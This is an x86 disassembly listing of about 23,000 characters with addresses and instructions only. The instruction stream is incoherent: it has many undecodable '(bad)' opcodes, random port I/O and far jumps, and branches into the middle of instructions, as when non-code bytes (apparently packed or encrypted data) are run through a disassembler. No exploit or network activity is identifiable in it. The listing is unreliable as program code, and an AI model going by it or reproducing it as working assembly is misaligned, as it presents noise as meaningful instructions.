  404f49:	in     al,0x61
  404f4b:	jno    0x404f42
  404f4d:	lea    esp,[ecx]
  404f4f:	dec    eax
  404f50:	pandn  mm0,QWORD PTR [ebx]
  404f53:	mov    ds:0x482c3f62,al
  404f58:	(bad)  
  404f59:	xchg   ebp,eax
  404f5a:	mov    eax,0x3822b95f
  404f5f:	xor    BYTE PTR [edx+0x11],bh
  404f62:	pop    DWORD PTR [esi-0x2f]
  404f65:	inc    esi
  404f66:	add    DWORD PTR [esi],ebx
  404f68:	mov    ds:0x41c63a72,al
  404f6d:	mov    ch,0xbc
  404f6f:	leave  
  404f70:	cmp    BYTE PTR [edi-0x4d],bh
  404f73:	cli    
  404f74:	data16 add dl,BYTE PTR [ebp+0x695630d]
  404f7b:	inc    esp
  404f7c:	ret    
  404f7d:	inc    ecx
  404f7e:	dec    edx
  404f7f:	std    
  404f80:	ret    0x6990
  404f83:	pushf  
  404f84:	push   ebx
  404f85:	xor    al,0x8a
  404f87:	fsubrp st(0),st
  404f89:	int    0x4b
  404f8b:	fs or  edx,eax
  404f8e:	add    al,0xd7
  404f90:	loop   0x404f93
  404f92:	(bad)  
  404f93:	test   eax,0x5b26f40
  404f98:	pop    ebx
  404f99:	push   ebp
  404f9a:	test   DWORD PTR [ebx+0x5f],ecx
  404f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f9e:	(bad)  
  404f9f:	xor    al,0x9c
  404fa1:	jg     0x404f28
  404fa3:	mov    cl,0x2
  404fa5:	in     al,0xe6
  404fa7:	dec    esi
  404fa8:	clc    
  404fa9:	jnp    0x404f37
  404fab:	cld    
  404fac:	into   
  404fad:	adc    cl,BYTE PTR [eax]
  404faf:	or     al,0x76
  404fb1:	xor    ebx,DWORD PTR [ebp+0x64]
  404fb4:	cmp    eax,0x820f2ef9
  404fb9:	sbb    dl,bl
  404fbb:	inc    ecx
  404fbc:	aad    0x28
  404fbe:	out    dx,eax
  404fbf:	rol    dh,1
  404fc1:	dec    ebp
  404fc2:	daa    
  404fc3:	aad    0xa9
  404fc5:	push   eax
  404fc6:	pusha  
  404fc7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fc9:	rcr    ecx,0x4c
  404fcc:	or     DWORD PTR [edi+0x67c284fd],0xa966c060
  404fd6:	inc    ecx
  404fd7:	dec    ecx
  404fd8:	je     0x405046
  404fda:	xchg   edx,eax
  404fdb:	je     0x404f85
  404fdd:	(bad)  
  404fde:	pop    esp
  404fdf:	mov    bl,BYTE PTR [edx-0x4bf4b9e6]
  404fe5:	cli    
  404fe6:	cdq    
  404fe7:	(bad)  
  404fe8:	js     0x405023
  404fea:	je     0x40503a
  404fec:	mov    ds:0x8ac6ca78,al
  404ff1:	aad    0x12
  404ff3:	xor    al,0x3a
  404ff5:	(bad)  [edx]
  404ff7:	pop    ss
  404ff8:	jge    0x405060
  404ffa:	nop
  404ffb:	in     eax,dx
  404ffc:	repz dec ebx
  404ffe:	jp     0x404fa6
  405000:	gs pop esp
  405002:	and    DWORD PTR ds:0x314bd0bd,eax
  405008:	push   0xc251cc6e
  40500d:	mov    al,ds:0x90b74646
  405012:	scas   eax,DWORD PTR es:[edi]
  405013:	inc    esi
  405014:	rcr    ebp,cl
  405016:	xor    dl,BYTE PTR [edx+0x73e5d1b9]
  40501c:	add    ecx,esi
  40501e:	mov    ds:0xaafd4ac5,al
  405023:	loopne 0x405065
  405025:	jmp    0x23be:0x8bd14225
  40502c:	aaa    
  40502d:	gs adc eax,0xed2865cb
  405033:	xchg   esp,eax
  405034:	rcr    esi,1
  405036:	icebp  
  405037:	in     al,0x22
  405039:	sub    bl,BYTE PTR [ebp-0x5c]
  40503c:	mov    ah,0xe7
  40503e:	and    al,BYTE PTR [esi]
  405040:	jp     0x4050a5
  405042:	fmul   QWORD PTR [edi-0x109baa64]
  405048:	pop    esi
  405049:	sahf   
  40504a:	add    bh,dl
  40504c:	jmp    0x405009
  40504e:	out    0x88,al
  405050:	mov    al,0x8d
  405052:	mov    esi,0x47e84d05
  405057:	dec    ebp
  405058:	sbb    BYTE PTR [edx-0x58af62df],ch
  40505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40505f:	(bad)  
  405060:	mov    ah,0x7
  405062:	cwde   
  405063:	xor    BYTE PTR [eax-0x23252856],bh
  405069:	fimul  DWORD PTR [ebx-0x526a40b3]
  40506f:	push   edx
  405070:	add    BYTE PTR [ebp+ebx*4-0xd],0xb
  405075:	clc    
  405076:	fmul   QWORD PTR [ebx-0x5]
  405079:	fisttp DWORD PTR [esi]
  40507b:	push   edi
  40507c:	popf   
  40507d:	dec    esp
  40507e:	jmp    0x4050ed
  405080:	and    al,0xf4
  405082:	jmp    0x405030
  405084:	(bad)  
  405085:	jl     0x405058
  405087:	jmp    0xafed:0xc088a5ef
  40508e:	dec    ebp
  40508f:	xor    al,0x14
  405091:	fwait
  405092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405093:	push   esi
  405094:	pop    ebx
  405095:	add    DWORD PTR [eax+0x56],eax
  405098:	hlt    
  405099:	jge    0x405040
  40509b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40509c:	dec    ebp
  40509d:	or     BYTE PTR [ecx-0x5f6d4c8f],ah
  4050a3:	ffreep st(4)
  4050a5:	(bad)  
  4050a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050a8:	rol    BYTE PTR [ecx+0x4c],cl
  4050ab:	push   ss
  4050ac:	pop    esp
  4050ad:	mov    ebp,0xb895f3b2
  4050b2:	jne    0x4050d3
  4050b4:	lods   eax,DWORD PTR ds:[esi]
  4050b5:	inc    esp
  4050b6:	popf   
  4050b7:	lds    edx,FWORD PTR [edi]
  4050b9:	iret   
  4050ba:	cld    
  4050bb:	loop   0x4050eb
  4050bd:	neg    BYTE PTR [esi+0x5b]
  4050c0:	dec    ebx
  4050c1:	addr16 ja 0x405120
  4050c4:	jmp    0xcef0742b
  4050c9:	mov    edx,DWORD PTR [edi-0x1e3ab447]
  4050cf:	inc    ebp
  4050d0:	dec    edi
  4050d1:	push   ebp
  4050d2:	sbb    DWORD PTR [esi],ecx
  4050d4:	in     al,0xa0
  4050d6:	aaa    
  4050d7:	xchg   edi,eax
  4050d8:	test   BYTE PTR [ecx+0x5df699ea],ch
  4050de:	mov    dl,0x35
  4050e0:	jne    0x4050be
  4050e2:	ss pushf 
  4050e4:	nop
  4050e5:	neg    BYTE PTR [ebx+0x3d]
  4050e8:	push   cs
  4050e9:	je     0x405142
  4050eb:	outs   dx,BYTE PTR ds:[esi]
  4050ec:	stos   BYTE PTR es:[edi],al
  4050ed:	retf   
  4050ee:	mov    ch,0xa3
  4050f0:	out    0x13,al
  4050f2:	div    BYTE PTR [eax]
  4050f4:	jl     0x40507d
  4050f6:	push   edi
  4050f7:	push   0xffffffb2
  4050f9:	retw   
  4050fb:	rcl    DWORD PTR [ebx+ebx*1],0x56
  4050ff:	add    BYTE PTR ds:0x4e635e,dh
  405105:	fldenv [ebx+0x6a]
  405108:	xor    ah,BYTE PTR [edi-0x7e399b53]
  40510e:	in     al,dx
  40510f:	fucomp st(2)
  405111:	lods   al,BYTE PTR ds:[esi]
  405112:	add    ecx,ebp
  405114:	iret   
  405115:	nop
  405116:	xor    cl,BYTE PTR ds:0x9b258e58
  40511c:	adc    al,0x7e
  40511e:	std    
  40511f:	mov    ds:0xa0284602,al
  405124:	ret    
  405125:	ror    DWORD PTR [ebx],cl
  405127:	test   al,0x32
  405129:	and    al,0x81
  40512b:	fiadd  DWORD PTR [edi]
  40512d:	pop    edi
  40512e:	inc    ebp
  40512f:	sbb    edi,DWORD PTR [ebx-0x1c988f]
  405135:	pushf  
  405136:	ja     0x4050d3
  405138:	ficomp DWORD PTR [ebp*1+0x120c5854]
  40513f:	imul   esi,DWORD PTR [esi-0x4f9fe725],0xab4c7a86
  405149:	arpl   WORD PTR [eax+0x3980749d],sp
  40514f:	ss mov cl,0xc4
  405152:	outs   dx,BYTE PTR ds:[esi]
  405153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405154:	inc    eax
  405155:	or     edx,DWORD PTR [edx-0x55]
  405158:	and    al,0x18
  40515a:	xchg   edx,eax
  40515b:	retf   0xa480
  40515e:	push   ds
  40515f:	or     al,0x8d
  405161:	pop    esi
  405162:	sbb    eax,0x50131034
  405167:	les    edx,FWORD PTR [eax+0x28]
  40516a:	mov    WORD PTR [esp+eax*8-0x446ac6e4],?
  405171:	cmp    al,0xcd
  405173:	and    cl,ch
  405175:	aaa    
  405176:	jbe    0x40517f
  405178:	cmp    eax,0x35fc2e62
  40517d:	ins    BYTE PTR es:[edi],dx
  40517e:	mov    WORD PTR [edx-0x4951c777],fs
  405184:	gs pop edi
  405186:	add    ch,BYTE PTR [edx-0x30ecc64]
  40518c:	pop    ds
  40518d:	sbb    al,0xf6
  40518f:	neg    BYTE PTR [eax+0x2d2ff539]
  405195:	mov    dl,0x5d
  405197:	inc    ecx
  405198:	mov    ebx,0x6f385ce7
  40519d:	cmovle edx,esp
  4051a0:	add    al,BYTE PTR [eax-0x16ece347]
  4051a6:	inc    ecx
  4051a7:	push   ecx
  4051a8:	and    ah,BYTE PTR ds:0xb6839086
  4051ae:	pop    esi
  4051af:	cmp    esp,DWORD PTR [ecx]
  4051b1:	adc    al,0x25
  4051b3:	mov    ds:0xa53c06f9,eax
  4051b8:	inc    edi
  4051b9:	cmp    DWORD PTR [edx],esi
  4051bb:	or     edi,ecx
  4051bd:	xor    edi,DWORD PTR [ebx]
  4051bf:	mov    cl,ch
  4051c1:	icebp  
  4051c2:	dec    ebp
  4051c3:	xchg   esi,ecx
  4051c5:	out    dx,eax
  4051c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051c7:	int3   
  4051c8:	dec    edi
  4051c9:	bound  edx,QWORD PTR [edi]
  4051cb:	fs jp  0x4051c6
  4051ce:	int    0x25
  4051d0:	pop    es
  4051d1:	add    cl,BYTE PTR [edi]
  4051d3:	xchg   DWORD PTR [edx-0x8],edx
  4051d6:	mov    fs,WORD PTR [esi-0x5dd8e5a6]
  4051dc:	out    dx,eax
  4051dd:	or     DWORD PTR [ecx-0x5f55ef4b],ebp
  4051e3:	and    ebx,DWORD PTR [ebx-0x73]
  4051e6:	sub    DWORD PTR [ebx+0x3a8dd8b4],0x85024834
  4051f0:	(bad)  
  4051f1:	or     ch,dl
  4051f3:	xor    al,BYTE PTR [ecx+0x60]
  4051f6:	stc    
  4051f7:	push   ds
  4051f8:	cdq    
  4051f9:	cld    
  4051fa:	mov    BYTE PTR [ebp+ebx*1-0x6b],al
  4051fe:	jnp    0x405244
  405200:	(bad)  
  405201:	sar    ecx,1
  405203:	xchg   esp,eax
  405204:	fxch   st(2)
  405206:	mov    ch,0x72
  405208:	loope  0x405252
  40520a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40520b:	js     0x4051fe
  40520d:	mov    ds:0x7c604cb0,al
  405212:	cmc    
  405213:	cs (bad) 
  405215:	mov    BYTE PTR [edi+edi*1+0x31],bl
  405219:	std    
  40521a:	add    al,BYTE PTR [ebp-0x470966f8]
  405220:	push   ecx
  405221:	sbb    eax,0x88583173
  405226:	hlt    
  405227:	sub    cl,BYTE PTR [edx+0x69db1b5b]
  40522d:	call   0x29759860
  405232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405233:	stos   BYTE PTR es:[edi],al
  405234:	xchg   BYTE PTR [ebx-0xad3f10d],dh
  40523a:	out    dx,al
  40523b:	jge    0x4051d2
  40523d:	cwde   
  40523e:	pop    ss
  40523f:	inc    ebx
  405240:	popa   
  405241:	fwait
  405242:	leave  
  405243:	xchg   edi,eax
  405244:	sahf   
  405245:	mov    al,0x97
  405247:	and    DWORD PTR [ecx],ecx
  405249:	ss popf 
  40524b:	dec    edx
  40524c:	and    BYTE PTR [eax-0x19b47b91],al
  405252:	sbb    al,0x41
  405254:	mov    ch,0x9a
  405256:	push   esi
  405257:	jle    0x4052a7
  405259:	pop    ss
  40525a:	not    DWORD PTR ds:0x8aa0457b
  405260:	ret    
  405261:	std    
  405262:	push   ecx
  405263:	cmc    
  405264:	adc    DWORD PTR [ecx],0xfe9ac963
  40526a:	mov    cl,dl
  40526c:	add    ebp,DWORD PTR [ecx-0x7b]
  40526f:	adc    eax,0x8c85c6a5
  405274:	outs   dx,BYTE PTR ds:[esi]
  405275:	loopne 0x40520b
  405277:	inc    esi
  405278:	push   ds
  405279:	or     ecx,DWORD PTR [edi-0x3f]
  40527c:	out    dx,al
  40527d:	lods   al,BYTE PTR ds:[esi]
  40527e:	dec    esi
  40527f:	sbb    eax,0x15bdce5a
  405284:	cli    
  405285:	xchg   esp,eax
  405286:	ja     0x4052e2
  405288:	jo     0x40526f
  40528a:	out    0x28,al
  40528c:	loop   0x4052c1
  40528e:	mov    eax,0xff26e8f5
  405293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405294:	out    dx,eax
  405295:	ret    0x4c7b
  405298:	repz imul eax,DWORD PTR fs:[ebx-0x274b5fcb],0x53adbcaf
  4052a4:	outs   dx,DWORD PTR ds:[esi]
  4052a5:	xor    edx,DWORD PTR [esi-0x40]
  4052a8:	xor    ecx,ebp
  4052aa:	and    eax,0x2c0331d0
  4052af:	sbb    BYTE PTR ss:0xa17ac4c,0xbe
  4052b7:	adc    eax,0xaaacb84a
  4052bc:	xchg   ebx,eax
  4052bd:	inc    BYTE PTR [esi+0x79]
  4052c0:	dec    edx
  4052c1:	cs and al,0xb0
  4052c4:	add    DWORD PTR [ebx+eiz*1-0x6e889c41],edx
  4052cb:	ret    
  4052cc:	fprem  
  4052ce:	xor    DWORD PTR [edi],ebp
  4052d0:	mov    ebx,DWORD PTR [edi]
  4052d2:	mov    ebx,0x5242e848
  4052d7:	mov    esi,0x8e2391ff
  4052dc:	inc    esp
  4052dd:	retf   
  4052de:	imul   esi,DWORD PTR [eax],0xffffffe4
  4052e1:	dec    esp
  4052e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052e3:	mov    edx,DWORD PTR [ecx]
  4052e5:	sub    esp,DWORD PTR [edx]
  4052e7:	mov    dh,0x63
  4052e9:	mov    BYTE PTR [edx+edx*2],bh
  4052ec:	retf   0xbc4d
  4052ef:	jno    0x4052b5
  4052f1:	jnp    0x405274
  4052f3:	sbb    DWORD PTR [ebx+0x14f703e2],ebx
  4052f9:	push   ds
  4052fa:	(bad)  [eax+0x74]
  4052fd:	dec    edi
  4052fe:	sub    al,0xab
  405300:	iret   
  405301:	xor    ebx,edx
  405303:	shl    DWORD PTR [eax+0x3bb19440],cl
  405309:	and    ebp,edx
  40530b:	std    
  40530c:	or     cl,cl
  40530e:	cmp    al,0x13
  405310:	sbb    ebx,DWORD PTR [esi+0x51c6a710]
  405316:	add    DWORD PTR [ebx],ebx
  405318:	jl     0x4052de
  40531a:	cdq    
  40531b:	ficom  WORD PTR [edi]
  40531d:	imul   esp,DWORD PTR [edx+0x10606254],0x37
  405324:	aaa    
  405325:	ins    BYTE PTR es:[edi],dx
  405326:	jecxz  0x405348
  405328:	imul   eax,DWORD PTR [esi-0x34],0x74e01c15
  40532f:	popf   
  405330:	cmp    DWORD PTR [ebx-0x56073843],esp
  405336:	inc    ebp
  405337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405338:	pop    es
  405339:	inc    ebp
  40533a:	test   al,0xa
  40533c:	imul   esi,DWORD PTR [ecx],0xcdd7e4e4
  405342:	xchg   ebx,eax
  405343:	push   esp
  405344:	xor    ch,ah
  405346:	pop    edx
  405347:	inc    esp
  405348:	jge    0x4052f9
  40534a:	pop    ecx
  40534b:	fcom   DWORD PTR [esi*4+0x72d94e1b]
  405352:	jp     0x40532f
  405354:	or     esp,esi
  405356:	or     eax,0x639bfc6
  40535b:	mov    DWORD PTR [ecx-0x5d],esp
  40535e:	xchg   esi,eax
  40535f:	xor    BYTE PTR [eax],al
  405361:	sbb    eax,0x47ca14af
  405366:	int    0xda
  405368:	das    
  405369:	ror    esi,cl
  40536b:	mov    ah,ah
  40536d:	retf   0x2002
  405370:	xchg   esp,eax
  405371:	jns    0x40539d
  405373:	or     bl,bh
  405375:	scas   al,BYTE PTR es:[edi]
  405376:	cld    
  405377:	sbb    BYTE PTR [eax],al
  405379:	scas   al,BYTE PTR es:[edi]
  40537a:	mov    ds:0x7aafb0fc,al
  40537f:	add    al,0x13
  405381:	aaa    
  405382:	jmp    0x405387
  405384:	add    ecx,edi
  405386:	cmp    eax,0x107bc01d
  40538b:	pop    esp
  40538c:	lds    ecx,FWORD PTR [edi]
  40538e:	push   ds
  40538f:	lods   eax,DWORD PTR ds:[esi]
  405390:	dec    esi
  405391:	jmp    0xa456:0x726ebdea
  405398:	push   ds
  405399:	das    
  40539a:	adc    al,0x2a
  40539c:	pop    ecx
  40539d:	push   cs
  40539e:	pop    es
  40539f:	push   ss
  4053a0:	test   al,0x56
  4053a2:	mov    bh,0x6c
  4053a4:	lods   al,BYTE PTR ds:[esi]
  4053a5:	and    bl,BYTE PTR [edi-0x23]
  4053a8:	in     al,0x91
  4053aa:	xchg   ecx,eax
  4053ab:	lahf   
  4053ac:	xchg   edx,eax
  4053ad:	cld    
  4053ae:	push   es
  4053af:	clc    
  4053b0:	in     eax,0xdd
  4053b2:	sti    
  4053b3:	ja     0x4053ee
  4053b5:	dec    edx
  4053b6:	addr16 add ebx,ebp
  4053b9:	push   eax
  4053ba:	adc    eax,0x5e82dd5f
  4053bf:	cmp    BYTE PTR [esp+ecx*8],0xf3
  4053c3:	inc    ebp
  4053c4:	dec    esp
  4053c5:	xchg   ebp,eax
  4053c6:	jl     0x40540b
  4053c8:	and    DWORD PTR [ecx+0x12],edi
  4053cb:	adc    bl,bl
  4053cd:	push   es
  4053ce:	dec    esp
  4053cf:	adc    al,BYTE PTR [esi-0x68]
  4053d2:	sbb    eax,0xca59aaf1
  4053d7:	cmp    al,BYTE PTR [esi]
  4053d9:	mov    DWORD PTR ds:0xdc45b977,0xb6548f44
  4053e3:	fcomp  DWORD PTR [esi]
  4053e5:	cmp    ebp,eax
  4053e7:	repnz add al,0x73
  4053ea:	pop    ds
  4053eb:	add    eax,0x6f61717c
  4053f0:	jmp    0x4053c6
  4053f2:	(bad)  
  4053f3:	clc    
  4053f4:	mov    al,ds:0x545780ff
  4053f9:	in     al,dx
  4053fa:	push   cs
  4053fb:	dec    BYTE PTR [edi+ebx*8+0x4ee5a61a]
  405402:	xlat   BYTE PTR ds:[ebx]
  405403:	das    
  405404:	inc    esp
  405405:	pop    edi
  405406:	test   al,0x23
  405408:	pop    ebx
  405409:	pop    ebp
  40540a:	lods   eax,DWORD PTR ds:[esi]
  40540b:	std    
  40540c:	pop    eax
  40540d:	push   es
  40540e:	and    DWORD PTR [esi+0x202a4fbf],esp
  405414:	mov    dl,0x12
  405416:	cmp    al,0x78
  405418:	lock ja 0x4053dc
  40541b:	dec    esp
  40541c:	mov    bl,0x9f
  40541e:	dec    edx
  40541f:	mov    al,ds:0xa2d68ff1
  405424:	fwait
  405425:	and    ebx,DWORD PTR ds:0x4a5d3383
  40542b:	mov    eax,0xc5c2b5be
  405430:	in     al,0xd2
  405432:	cli    
  405433:	dec    ebx
  405434:	arpl   WORD PTR [ebx],di
  405436:	add    DWORD PTR [ecx-0xf08ff6c],ebx
  40543c:	xchg   ebp,eax
  40543e:	push   edx
  40543f:	jmp    0xb181:0xb72d946b
  405446:	add    al,0x9
  405448:	out    dx,al
  405449:	les    edi,FWORD PTR ds:0x8e3ddd18
  40544f:	test   al,0x8e
  405451:	jns    0x405450
  405453:	test   DWORD PTR ds:0x48efd0b3,0xee838f80
  40545d:	adc    al,al
  40545f:	add    bh,ah
  405461:	in     al,0x55
  405463:	and    esi,edx
  405465:	push   ecx
  405466:	loope  0x40543b
  405468:	jmp    0x5d6ce45b
  40546d:	mov    BYTE PTR [edx],ah
  40546f:	adc    ecx,DWORD PTR [edi]
  405471:	mov    ds:0x4eddc1c0,eax
  405476:	pusha  
  405477:	in     al,0x87
  405479:	and    BYTE PTR [ebp-0x1375ac06],dl
  40547f:	inc    esp
  405480:	add    DWORD PTR [edi-0x584d3270],edx
  405486:	mov    ds:0xc352478e,eax
  40548b:	outs   dx,DWORD PTR ds:[esi]
  40548c:	popf   
  40548d:	sahf   
  40548e:	lock (bad) [esi+0x42]
  405492:	int3   
  405493:	push   ss
  405494:	sbb    edx,DWORD PTR [ebx]
  405496:	das    
  405497:	(bad)  
  405499:	in     al,0xa8
  40549b:	jo     0x405459
  40549d:	dec    ebp
  40549e:	test   DWORD PTR [edi-0x73],ebx
  4054a1:	or     DWORD PTR [esi+esi*1+0x40],esi
  4054a5:	xchg   ebp,eax
  4054a6:	xchg   edi,eax
  4054a7:	push   ebp
  4054a8:	xchg   ebx,eax
  4054a9:	sub    DWORD PTR [ebx],eax
  4054ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054ac:	xchg   ebp,eax
  4054ad:	stos   BYTE PTR es:[edi],al
  4054ae:	inc    esp
  4054af:	ds xor eax,0x628c7c0e
  4054b5:	fisttp DWORD PTR [eax*4+0x56a0da2a]
  4054bc:	scas   al,BYTE PTR es:[edi]
  4054bd:	dec    DWORD PTR [eax]
  4054bf:	cdq    
  4054c0:	and    BYTE PTR gs:[ebp+0x1c],bh
  4054c4:	pop    ecx
  4054c5:	ins    BYTE PTR es:[edi],dx
  4054c6:	push   0x6cd484c5
  4054cb:	and    cl,BYTE PTR [edx-0x51]
  4054ce:	cmovne esi,DWORD PTR [edx]
  4054d1:	(bad)  
  4054d2:	and    bh,ch
  4054d4:	inc    ecx
  4054d5:	jno    0x40552b
  4054d7:	adc    BYTE PTR [edi],cl
  4054d9:	mov    ebx,0x40f8519b
  4054de:	inc    ebp
  4054df:	clc    
  4054e0:	sub    DWORD PTR [eax-0x75],0x3f5a6639
  4054e7:	fadd   st,st(3)
  4054e9:	enter  0xb776,0xd8
  4054ed:	pop    esp
  4054ee:	out    0x55,al
  4054f0:	cmp    dh,BYTE PTR [ebp-0x1a]
  4054f3:	cmp    BYTE PTR [ebx+0x23976c72],bl
  4054f9:	or     eax,0xe448dab4
  4054fe:	cmp    ecx,DWORD PTR fs:[ebx-0x52]
  405502:	adc    ebx,edx
  405504:	xchg   BYTE PTR [edi],bl
  405506:	add    esp,esp
  405508:	cmp    DWORD PTR [eax+0x7682e5bd],ecx
  40550e:	(bad)  
  40550f:	les    ecx,FWORD PTR [esi-0x6b]
  405512:	(bad)  
  405514:	bound  ecx,QWORD PTR [ebx+eiz*4-0x4a2348b8]
  40551b:	dec    esp
  40551c:	sbb    ah,bh
  40551e:	or     eax,0xee62100a
  405523:	pop    ecx
  405524:	inc    ecx
  405525:	or     BYTE PTR [edi],al
  405527:	push   ecx
  405528:	inc    ecx
  405529:	push   ecx
  40552a:	add    eax,edx
  40552c:	sbb    edx,0x35
  40552f:	cmp    eax,0x27f9b6cd
  405534:	adc    ah,ch
  405536:	ins    BYTE PTR es:[edi],dx
  405537:	jns    0x4054d0
  405539:	test   DWORD PTR [eax],esi
  40553b:	adc    cl,dl
  40553d:	les    ecx,FWORD PTR [ebx+0x2]
  405540:	sbb    al,0xae
  405542:	pop    ebx
  405543:	jb     0x40554a
  405545:	test   BYTE PTR [ecx-0x61],dh
  405548:	ret    0xd502
  40554b:	(bad)  
  40554c:	and    cl,BYTE PTR [esi]
  40554e:	mov    DWORD PTR [edx+esi*1+0x79],edi
  405552:	rol    BYTE PTR [eax*4+0x33b9c60],0x43
  40555a:	ret    
  40555b:	jg     0x405584
  40555d:	into   
  40555e:	dec    eax
  40555f:	stc    
  405560:	sbb    BYTE PTR [ecx],dl
  405562:	pop    ebp
  405563:	fstp   QWORD PTR [esi]
  405565:	or     ch,BYTE PTR [ebx]
  405567:	test   al,0x8a
  405569:	or     dh,dh
  40556b:	mov    ah,BYTE PTR [esi]
  40556d:	in     eax,0xd0
  40556f:	mov    esi,0x2ba8253a
  405574:	cmp    eax,0xc580be4
  405579:	xor    al,0xb9
  40557b:	fcom   QWORD PTR [ebp+0x21]
  40557e:	cmp    DWORD PTR [ebx+0x44],eax
  405581:	push   ss
  405582:	gs stos BYTE PTR es:[edi],al
  405584:	xor    BYTE PTR [edx],dl
  405586:	popa   
  405587:	mov    bl,0x99
  40558a:	dec    BYTE PTR [ebx]
  40558c:	enter  0xa95e,0x24
  405590:	or     BYTE PTR ds:0xf74d22b,0xb3
  405597:	pushf  
  405598:	mov    esi,DWORD PTR [edi+0xb]
  40559b:	(bad)  
  40559d:	fcmovnb st,st(2)
  40559f:	push   cs
  4055a0:	out    dx,eax
  4055a1:	jne    0x4055bb
  4055a3:	mov    ds:0x43d42ce,eax
  4055a8:	stc    
  4055a9:	pop    ss
  4055aa:	add    BYTE PTR [edi],ch
  4055ac:	repz out 0xfe,eax
  4055af:	icebp  
  4055b0:	push   DWORD PTR [eax]
  4055b2:	pop    ss
  4055b3:	imul   esp,edi,0x73
  4055b6:	and    BYTE PTR [esi-0xea858c2],cl
  4055bc:	push   ebp
  4055bd:	adc    eax,0xfa429be3
  4055c2:	sbb    eax,0xd2a410c8
  4055c7:	lods   al,BYTE PTR ds:[esi]
  4055c8:	aam    0x24
  4055ca:	out    dx,eax
  4055cb:	push   0x25aedebb
  4055d0:	push   ss
  4055d1:	(bad)  
  4055d2:	cmp    eax,eax
  4055d4:	stos   BYTE PTR es:[edi],al
  4055d5:	inc    ecx
  4055d6:	lods   al,BYTE PTR ds:[esi]
  4055d7:	cmp    BYTE PTR [edx],bl
  4055d9:	loope  0x405595
  4055db:	aaa    
  4055dc:	pop    ebx
  4055dd:	mov    edx,0xdb6589fa
  4055e2:	retf   
  4055e3:	sub    eax,0x1b16118b
  4055e8:	fs pop ds
  4055ea:	jb     0x4055bc
  4055ec:	mov    edx,DWORD PTR [ecx]
  4055ee:	dec    ebx
  4055ef:	cmp    eax,0xed57247c
  4055f4:	or     eax,DWORD PTR [ebp-0x232fe1c3]
  4055fa:	inc    esi
  4055fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055fc:	mov    esp,0x8545e3de
  405601:	loopne 0x4055f2
  405603:	mov    esp,edi
  405605:	aad    0x38
  405607:	add    al,0x68
  405609:	adc    al,0x7e
  40560b:	xor    cl,ch
  40560d:	and    eax,edi
  40560f:	pop    ebx
  405610:	arpl   WORD PTR [ebp+0x5b516934],cx
  405616:	rcr    cl,0xce
  405619:	cmc    
  40561a:	push   ebx
  40561b:	dec    edi
  40561c:	push   eax
  40561d:	and    eax,esp
  40561f:	mov    eax,esi
  405621:	in     al,dx
  405622:	hlt    
  405623:	add    ax,cx
  405626:	frstor [ebp-0x8]
  405629:	adc    dh,BYTE PTR [ebx]
  40562b:	inc    esp
  40562c:	fdiv   st(7),st
  40562e:	pusha  
  40562f:	inc    esi
  405630:	inc    edi
  405631:	in     eax,dx
  405632:	enter  0xb75d,0x55
  405636:	nop
  405637:	int3   
  405638:	ja     0x405633
  40563a:	xor    ebp,eax
  40563c:	test   BYTE PTR [ecx-0x45],bh
  40563f:	adc    DWORD PTR [eax+0x35],esi
  405642:	jae    0x4055e8
  405644:	mov    BYTE PTR [edi-0x7e],bh
  405647:	xchg   DWORD PTR [edi-0x4169ad18],ebx
  40564d:	jno    0x405681
  40564f:	bswap  esp
  405651:	fadd   DWORD PTR [eax-0x3b]
  405654:	pop    esp
  405655:	stos   DWORD PTR es:[edi],eax
  405656:	and    BYTE PTR [ebp-0x25],bh
  405659:	test   BYTE PTR [edx+0x3f6076e4],bh
  40565f:	xchg   ebp,eax
  405660:	dec    edx
  405661:	mov    edx,eax
  405663:	fisub  WORD PTR [ebp+0x43771486]
  405669:	mov    ch,0xde
  40566b:	lock test eax,0x791cabc1
  405671:	push   eax
  405672:	lods   eax,DWORD PTR ds:[esi]
  405673:	adc    BYTE PTR [esi-0x2e],ah
  405676:	imul   ebp,esp,0x1d
  405679:	call   0xafe3:0x67bdcff9
  405680:	sbb    al,0x6c
  405682:	mov    dl,0x7
  405684:	adc    DWORD PTR gs:[ecx+esi*1+0x42c7f6cd],ebx
  40568c:	jp     0x4056db
  40568e:	dec    eax
  40568f:	push   es
  405690:	loopne 0x405662
  405692:	cmp    al,0x73
  405694:	jnp    0x4056c2
  405696:	fcomp  st(6)
  405698:	ss adc bl,ah
  40569b:	fnstenv [ebx+0x6919637b]
  4056a1:	or     BYTE PTR [edx-0x511c2aad],dh
  4056a7:	not    DWORD PTR ds:0x289fe6f4
  4056ad:	sti    
  4056ae:	inc    edi
  4056af:	xchg   esp,eax
  4056b0:	xchg   esi,eax
  4056b1:	jbe    0x405689
  4056b3:	push   ds
  4056b4:	ret    
  4056b5:	push   eax
  4056b6:	out    0xd4,al
  4056b8:	ret    
  4056b9:	std    
  4056ba:	jl     0x40565d
  4056bc:	mov    bh,0x10
  4056be:	xlat   BYTE PTR ds:[ebx]
  4056c0:	fcmovnbe st,st(2)
  4056c2:	add    bl,BYTE PTR [ecx-0xe9d4aa]
  4056c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c9:	pop    edi
  4056ca:	push   0xccb6caa
  4056cf:	cdq    
  4056d0:	push   cs
  4056d1:	rol    BYTE PTR [ebx-0x70],1
  4056d4:	sbb    al,0x64
  4056d6:	xchg   ebx,eax
  4056d7:	dec    edx
  4056d8:	sbb    eax,DWORD PTR [edi]
  4056da:	cmp    al,0x59
  4056dc:	cmp    ecx,DWORD PTR [eax-0x50]
  4056df:	call   0x37193576
  4056e4:	push   0x63
  4056e6:	lahf   
